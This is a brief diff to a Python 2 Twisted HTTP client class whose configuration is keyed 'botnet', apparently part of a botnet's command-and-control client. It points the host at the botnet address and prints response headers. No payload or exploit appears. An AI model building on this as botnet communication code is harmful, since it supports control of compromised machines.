@@ -136,7 +136,7 @@ class HTTPClientFactory(protocol.ClientFactory):
         self.config = config
         self.cookies = {}
         self.url = self.config['botnet']
-        self.host = self.config['myhost']
+        self.host = self.config['botnet']
         self.agent = self.config['useragent']
         self.path = self.config['path']
         self.method = self.config['method']
@@ -200,7 +200,7 @@ class HTTPClientFactory(protocol.ClientFactory):
         pass
         
     def gotHeaders(self, headers):
-        pass
+        print headers
         
     def noPage(self, reason):
         pass
